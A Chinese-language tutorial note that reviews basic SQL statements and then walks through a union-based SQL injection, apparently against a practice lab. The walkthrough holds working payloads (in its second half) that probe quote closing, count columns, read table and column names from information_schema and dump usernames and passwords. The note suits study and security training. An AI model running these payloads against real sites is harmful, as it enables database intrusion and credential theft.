# sql注入

## 基本知识
###  sql语句 

1：将user中的id，name等写入内容
```sql
insert into user(id,name,sex,birthday,job)
values(1,'jk','male',2005-09-28','it');
```
2：新增加一列内容，比如在user表中加一列salary最大8位小数点后面5位
```sql
alter table user add salary decimal(8,2);
```

3：修改内容，比如刚加入的列项salary没有内容
![alt text](image-237.png)

4：修改id=1行的name改为yjk
```sql
update user set name='yjk' where id=1;
```
![alt text](image-238.png)

4.修改回id=1的name为jk，同时修改salary为9000
```sql
update user set name='jk',salary=8000 where id=1;
```
![alt text](image-239.png)

5：删除列,例如删除slary这一列
```sql
alter  table user drop salary;
```

6：删除行
```sql
delete from user where job='it';
```

### 基本语句查询


**1:select +列名（*代表所有）from 表名 where 条件**

```sql
select *from users where id=3;
```

**2:从users表格中查询所有包含id为3的，效果和上一条查询语句一样**
```sql
select * from users where id in ('3');
```

**3.如果有括号括号里面的内容先查询**，比如我通过id查admin的信息，但是记不起来admin的id可以通过名字找到这一行，虽然看起来多此一举，但有的之后特别有用
```sql
select * from users where id=(select id from users where username='admin');
```
![alt text](image-240.png)

**4：联合查询**
查询合并数据显示，例如先查询users中的id信息然后再查询email_id的信息
```sql
select id from users union select email_id from emails;
```
![alt text](image-241.png)
注意联合查询是两边列数要相同
```sql
select * from users where id=1 union select * from emails where id=1;
```
![alt text](image-242.png)
因为users的所有列项有3列，但是emalis只有两列
为了解决这个问题可以**在列数少的那添加列**
```sql
select * from users where id=1 union select *,2 from emails where id=1;
```
此处在*后面加了,2表示加了一列且值为2，这样两遍都是3
列就可以查询了
![alt text](image-243.png)

**5:group by分组还可以用来判断列数**

用group by把内容一样的分到一组
```sql
select username from users group by username;
```
通过group by来判断有几列 
![alt text](image-244.png)
![alt text](image-245.png)
由上面两张图可以知道group by 1可以执行，2不可以执行，因为前面的返回字段是username，只有这一列内容无法对两列进行分组
为了知道有多少列，可以用下面这个sql语句
```sql
select * from users where id=1 gruop by 3;
```
不断的修改group by 后面的数字就可以知道到底多少列了
类似于group by的还有order by，但是order by的作用是将内容升序排序，同样可以用来判断列数

**6:限制输出内容数量**（一般用于报错注入）
限制为从第一行开始显示三行（注意真正的第一行是从0开始的）这里的第一行实际是第二行
```sql
select * from users limit 1,3;
```

**7:and和or**
例如查询id=1且username='jk'的
```sql
select * from user where id=1 and username='jk';
```
同样的还可以用or表示满住或的关系（or还可以用来做万能密码）

**8.group_concat**
把多行显示到一行，因为有的题目回限制输出行数，所以经常用group_concat将内容合并为一行
```sql
select group_concat(id,username,password) from users
```
![alt text](image-246.png)

**9.select database**
查看当前数据库的名字
```sql 
select database();
```
![alt text](image-247.png)

**10.selece version()**
查看当前数据库版本，常用于防火墙绕过
```sql
select version();
```
![alt text](image-248.png)




## sql注入
### 什么是注入
说为sql注入就是把sql命令插入到web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意sql命令以获得重要信息，即**构造一条精巧的语句得到想要的信息**

### 注入分类：
1. 按照查询字符型与数字型
使用and 1=1和and 1=2来来判断，字符型and 1=2是不可以正确回显的
字符型
![alt text](image-249.png)
数字型
![alt text](image-250.png)
2. 按照注入方式分类：union注入，报错注入，布尔注入，时间注入等

### 什么是注入点

实行注入的地方，例如通过post,get,cookie等地方

### 闭合
手动提交闭合符号例如“ ' " '# ”等，结束前一段查询语句即可加入其他语句，查询需要的参数不需要的语句可以用注释符号“--+ 或%23”注释掉

### 步骤
1. **先判断闭合方式' " '#等**
例如输入单引号报错，但是用--+注释掉之后页面正常说明就是单引号闭合
![alt text](image-251.png)
![alt text](image-252.png)


2. **判断列数**
    原因：unioun注入需要知道每个表的列数，不然会出现错误，所以要用group by或order by 来判断列数
例如：
```sql
id=1'group by 4 --+
```
group的原理是分组，超过了组数就报错
![alt text](image-253.png)
![alt text](image-254.png)
结合上面两张图可以知道有4列

```sql
id=1'order by 3--+
```
order的原理是从第i列排序，超过i列就会报错
3. **查看回显位**
```sql
id=-1'union select 1,2,3,--+
```

**注意这里现在是-1' 而不是1'了**，因为页面又是只会回显第一行数据，为了显示其他数据要将1改为负数或0.
![alt text](image-255.png)
这种情况2，3就是回显位
所以2可以在2这里加一个database（）
![alt text](image-256.png)
这样就回显内容了，改1是不会回显的

4. **拿到表名的信息**
数据库information_schema 包含所有mysql数据库的简要信息，其中包含两个数据表
tables 表名集合表
columns 列名集合表
```sql
?id=-1' union select 1,2,table_name from information_schema.tables --+
```
上述语句表示从数据库information_schema中的数据表tables获取数据列table_name，即查询数据库中的所有表名
![alt text](image-257.png)
但是这个语句纯在很大局限，表里的内容很多，但是这里只能显示第一个内容，而且我们想要的是当前数据表的，因此可以改为
```sql
?id=-1' union select 1,2,table_name from information_schema.tables where table_schema=database()--+
```
或者将database()修改为'security',因为前面在查看回显位的时候用database()函数得到了数据表名
![alt text](image-258.png)
这样查询还是有缺陷因为得不到所有security中的所有表名，所以这里利用了前面讲到的函数group_concat()了
```sql
?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+
```

![alt text](image-259.png)

5. **查找列名的信息**
想要查找的信息在数据库information_schema的数据表columns的数据列column_name
```sql
?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database()--+
```
![alt text](image-260.png)
这里如果想要的是users中的列名,可以用and tabale_name='想看的数据表'
```sql
?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'--+
```
![alt text](image-261.png)

6. **获取数据**
这里想要获取username 和 password 的信息
```sql
?id=-1' union select 1,2,group_concat(username,password) from users--+
```

![alt text](image-262.png)
为了美观这里还可以用分隔符分割开，只需改为group_concat(username,'~',password)